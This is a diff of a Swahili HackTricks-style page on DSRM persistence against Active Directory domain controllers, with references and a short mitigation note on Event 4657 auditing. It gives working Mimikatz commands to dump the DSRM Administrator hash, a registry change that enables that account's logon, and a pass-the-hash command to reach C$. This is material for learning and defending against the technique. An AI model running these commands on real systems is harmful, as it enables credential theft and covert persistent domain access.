@@ -2,34 +2,39 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Maelezo ya Msingi
+## Taarifa za Msingi
 
-Kuna akaunti ya **local administrator** ndani ya kila **DC**. Ukiwa na privileges za admin kwenye mashine hii, unaweza kutumia mimikatz kufanya **dump** ya **local Administrator hash**. Kisha, ukirekebisha registry ili **activate this password**, unaweza kufikia kwa mbali mtumiaji huyu wa local Administrator.\
-Kwanza tunahitaji kufanya **dump** ya **hash** ya mtumiaji wa **local Administrator** ndani ya DC:
-```bash
+Kila domain controller ina akaunti ya msimamizi ya Directory Services Restore Mode (DSRM). Nenosiri lake huwekwa wakati wa ku-promote domain controller na ni tofauti na akaunti za Active Directory domain.<sup>[[1]](#references)</sup>
+
+Mshambulizi aliye na udhibiti wa kiutawala wa domain controller anaweza kudump database ya ndani ya SAM na kurejesha NTLM hash ya DSRM Administrator. Command ifuatayo ya Mimikatz hufanya operesheni hiyo:<sup>[[2]](#references)</sup>
+```powershell
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 ```
-Kisha tunahitaji kuangalia ikiwa akaunti hiyo itafanya kazi, na ikiwa registry key ina thamani ya "0" au haipo, unahitaji **kuiweka kuwa "2"**:
-```bash
-Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
-New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
-Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
+Kwa chaguo-msingi, akaunti ya DSRM imekusudiwa kwa hali ya kurejesha. Kuweka `DsrmAdminLogonBehavior` kuwa `2` huruhusu akaunti hii ya ndani kufanya authentication wakati domain controller inaendelea kufanya kazi kwa kawaida. Kagua thamani hiyo kabla ya kuibadilisha:<sup>[[2]](#references)[[3]](#references)</sup>
+```powershell
+$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
+$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue
+
+if ($null -eq $current) {
+New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
+} else {
+Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
+}
 ```
-Kisha, kwa kutumia PTH unaweza **kuorodhesha yaliyomo kwenye C$ au hata kupata shell**. Zingatia kwamba ili kuunda session mpya ya powershell yenye hiyo hash kwenye memory (kwa ajili ya PTH), **"domain" inayotumika ni jina tu la mashine ya DC:**
-```bash
+Hash iliyopatikana inaweza kutumika katika session ya pass-the-hash kufikia resources kama vile share ya kiutawala `C$`. Kwa akaunti hii ya ndani, tumia jina la computer la domain controller kama thamani ya `/domain`:<sup>[[3]](#references)</sup>
+```powershell
 sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
-#And in new spawned powershell you now can access via NTLM the content of C$
+# In the new PowerShell process, access C$ over NTLM.
 ls \\dc-host-name\C$
 ```
-Maelezo zaidi kuhusu hili yanapatikana kwenye: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) na [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>
+## Mitigation
 
-## Upunguzaji wa athari
+- Kagua mabadiliko kwenye `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. Tukio la usalama 4657 hurekodi marekebisho ya thamani ya registry wakati SACL ya ufunguo imesanidiwa kukagua shughuli za **Set Value**.<sup>[[4]](#references)</sup>
 
-- Event ID 4657 - Kagua uundaji/mabadiliko ya `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`
+## References
 
-## Marejeo
-
-- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
-- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)
-
+- [1] [Microsoft: Weka upya nenosiri la msimamizi wa Directory Services Restore Mode](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
+- [2] [ADSecurity: Persistence ya Kisiri kwenye Active Directory #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
+- [3] [ADSecurity: Persistence ya Kisiri kwenye Active Directory #13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
+- [4] [Microsoft: Tukio la 4657 — Thamani ya registry ilirekebishwa](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
 {{#include ../../banners/hacktricks-training.md}}
